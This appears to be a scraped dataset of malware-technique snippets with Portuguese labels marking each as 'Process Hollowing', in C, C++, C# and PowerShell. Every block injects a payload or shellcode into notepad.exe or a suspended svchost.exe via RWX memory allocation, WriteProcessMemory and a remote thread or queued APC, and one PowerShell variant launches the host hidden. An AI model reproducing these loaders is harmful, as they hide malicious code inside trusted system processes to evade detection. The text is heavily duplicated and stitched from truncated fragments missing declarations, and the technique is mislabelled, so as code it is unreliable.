// Linguagem: C#
// Categoria: Process Hollowing
Process target = Process.Start("notepad.exe");
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, payload, payload.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

$hProcess = OpenProcess(0x1F0FFF, $false, $proc.Id)
$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)

WriteProcessMemory(hProcess, pRemoteBuffer, payload, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

$hProcess = OpenProcess(0x1F0FFF, $false, $proc.Id)
$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)
--valknut--satty--
// Linguagem: C
// Categoria: Process Hollowing
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, payload, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
--valknut--satty--
// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)
--valknut--satty--
// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

Process target = Process.Start("notepad.exe");
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, payload, payload.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

// Linguagem: PowerShell
// Categoria: Process Hollowing
$bytes = [System.IO.File]::ReadAllBytes("payload.bin")
$proc = Start-Process -FilePath "svchost.exe" -PassThru -WindowStyle Hidden
$hProcess = OpenProcess(0x1F0FFF, $false, $proc.Id)
$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)
--valknut--satty--
// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

$hProcess = OpenProcess(0x1F0FFF, $false, $proc.Id)
$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)
--valknut--satty--
// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);
--valknut--satty--

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, payload, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

Process target = Process.Start("notepad.exe");
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, payload, payload.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

// Categoria: Process Hollowing
$bytes = [System.IO.File]::ReadAllBytes("payload.bin")
$proc = Start-Process -FilePath "svchost.exe" -PassThru -WindowStyle Hidden
$hProcess = OpenProcess(0x1F0FFF, $false, $proc.Id)
$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)

$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)

WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, payload, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, payload, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, payload, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);

// Linguagem: PowerShell
// Categoria: Process Hollowing
$bytes = [System.IO.File]::ReadAllBytes("payload.bin")
$proc = Start-Process -FilePath "svchost.exe" -PassThru -WindowStyle Hidden
$hProcess = OpenProcess(0x1F0FFF, $false, $proc.Id)
$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)
--valknut--satty--
// Linguagem: C++
// Categoria: Process Hollowing
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);
--valknut--satty--
// Linguagem: C#
// Categoria: Process Hollowing
Process target = Process.Start("notepad.exe");
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, payload, payload.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)

$hProcess = OpenProcess(0x1F0FFF, $false, $proc.Id)
$remoteAddr = VirtualAllocEx($hProcess, 0, $bytes.Length, 0x1000, 0x40)
WriteProcessMemory($hProcess, $remoteAddr, $bytes, $bytes.Length, [ref]0)
CreateRemoteThread($hProcess, 0, 0, $remoteAddr, 0, 0, [ref]0)
--valknut--satty--
// Linguagem: C#
// Categoria: Process Hollowing
Process target = Process.Start("notepad.exe");
IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, addr, payload, payload.Length, out _);
CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

PROCESS_INFORMATION pi;
CreateProcess(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);

WriteProcessMemory(hProcess, pRemoteBuffer, payload, size, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);

LPVOID remoteBuffer = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, remoteBuffer, shellcode, payloadSize, NULL);
QueueUserAPC((PAPCFUNC)remoteBuffer, pi.hThread, NULL);
ResumeThread(pi.hThread);
